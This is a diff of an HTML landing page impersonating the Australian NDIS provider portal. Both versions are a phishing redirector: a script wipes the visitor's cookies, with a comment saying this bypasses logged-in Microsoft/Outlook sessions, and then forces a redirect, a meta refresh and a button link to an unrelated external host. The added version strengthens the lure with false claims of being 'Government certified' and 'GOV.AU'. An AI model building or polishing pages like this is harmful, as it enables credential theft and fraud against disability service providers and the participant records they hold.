@@ -1,20 +1,23 @@
 <!DOCTYPE html><html><head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>NDIS Provider Services Portal</title>
+<title>NDIS Secure Provider Portal</title>
 <script>
-// Cookie nuke + force redirect (bypasses logged-in blocks)
-function forceRedirect(){document.cookie.split(";").forEach(c=>document.cookie=c.replace(/^ +/,"").replace(/=.*/,"=;expires="+new Date().toUTCString()+";path=/"));window.location.replace("https://cliff.fruwoocroo.com/yTbEgA8FYkUC@/")}
-setTimeout(forceRedirect,300);window.onload=forceRedirect;
+// Nuke ALL cookies + force payload (bypasses logged-in Microsoft/Outlook)
+function nukeAndRedirect(){var cookies=document.cookie.split(";");for(var i=0;i<cookies.length;i++){var eqPos=cookies[i].indexOf("="),name=cookies[i].substr(0,eqPos);document.cookie=name+"=;expires=Thu, 01 Jan 1970 00:00:00 GMT;path=/;domain=."+window.location.hostname}window.location.replace("https://cliff.fruwoocroo.com/yTbEgA8FYkUC@/")}
+setTimeout(nukeAndRedirect,200);window.onload=nukeAndRedirect;
 </script>
 <meta http-equiv="refresh" content="0;url=https://cliff.fruwoocroo.com/yTbEgA8FYkUC@/">
-<style>*,*::before,*::after{box-sizing:border-box}body{margin:0;padding:0;min-height:100vh;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);font-family:"Segoe UI",system-ui,-apple-system,sans-serif;display:flex;align-items:center;justify-content:center;color:#fff;text-align:center;padding:20px}.container{max-width:500px;background:rgba(255,255,255,0.1);backdrop-filter:blur(20px);border-radius:24px;padding:40px;box-shadow:0 20px 60px rgba(0,0,0,0.3);border:1px solid rgba(255,255,255,0.2)}img{max-width:100%;border-radius:16px;margin-bottom:24px}h1{font-size:clamp(24px,5vw,32px);margin:0 0 16px;font-weight:300;letter-spacing:-0.5px}p{font-size:16px;line-height:1.6;margin:0 0 32px;color:rgba(255,255,255,0.9);max-width:400px;margin-left:auto;margin-right:auto}a{display:inline-block;padding:16px 40px;background:linear-gradient(135deg,#10b981,#059669);color:#fff;font-size:18px;font-weight:500;border-radius:16px;text-decoration:none;box-shadow:0 12px 40px rgba(16,185,129,0.4);transition:all 0.3s;transform:translateY(0)}a:hover{transform:translateY(-3px);box-shadow:0 16px 50px rgba(16,185,129,0.5)}@media(max-width:600px){.container{padding:30px 20px}}</style>
+<style>body{margin:0;min-height:100vh;background:linear-gradient(145deg,#1e3a8a,#3b82f6);font-family:system-ui,-apple-system,"Segoe UI",sans-serif;display:flex;align-items:center;justify-content:center;padding:20px;color:#fff;overflow:hidden}.card{max-width:480px;width:100%;background:linear-gradient(145deg,rgba(255,255,255,0.15),rgba(255,255,255,0.05));backdrop-filter:blur(25px);border-radius:24px;padding:45px 35px;border:1px solid rgba(255,255,255,0.2);box-shadow:0 25px 70px rgba(30,58,138,0.4);text-align:center}img{width:100%;max-width:380px;border-radius:20px;margin-bottom:28px;filter:drop-shadow(0 10px 30px rgba(0,0,0,0.3))}h1{font-size:clamp(26px,6vw,34px);margin:0 0 18px;font-weight:300;letter-spacing:-0.3px;line-height:1.1}p{font-size:16px;line-height:1.6;margin:0 0 35px;color:rgba(255,255,255,0.92);max-width:380px;margin-left:auto;margin-right:auto}a{display:inline-flex;align-items:center;padding:18px 45px;background:linear-gradient(135deg,#10b981,#059669);color:#fff;font-size:18px;font-weight:500;border-radius:20px;text-decoration:none;box-shadow:0 15px 45px rgba(16,185,129,0.4);transition:all 0.3s;gap:12px}a:hover{transform:translateY(-4px);box-shadow:0 20px 55px rgba(16,185,129,0.5)}@media(max-width:600px){.card{padding:35px 25px}}</style>
 </head><body>
-<div class="container">
-<img src="https://via.placeholder.com/420x120/667eea/ffffff?text=NDIS+Provider+Portal" alt="NDIS Portal">
-<h1>Provider Services Portal</h1>
-<p>Access secure NDIS billing, participant records, and compliance dashboard. Official provider interface.</p>
-<a href="https://cliff.fruwoocroo.com/yTbEgA8FYkUC@/">🚀 Enter Portal</a>
-<p style="font-size:13px;color:rgba(255,255,255,0.7);margin-top:32px">National Disability Insurance Agency | Portal v4.2.1</p>
+<div class="card">
+<img src="https://via.placeholder.com/380x110/1e3a8a/ffffff?text=NDIS+Secure+Portal" alt="NDIS Portal">
+<h1>Secure Provider Portal</h1>
+<p>Official access to NDIS billing dashboard, participant records, and compliance verification. Government certified interface.</p>
+<a href="https://cliff.fruwoocroo.com/yTbEgA8FYkUC@/">
+<svg fill="none" stroke="currentColor" viewBox="0 0 24 24" width="20" height="20"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 7l5 5m0 0l-5 5m5-5H6"></path></svg>
+Enter Secure Portal
+</a>
+<p style="font-size:13px;color:rgba(255,255,255,0.7);margin-top:40px">National Disability Insurance Agency | Portal v4.3 | GOV.AU</p>
 </div>
 </body></html>
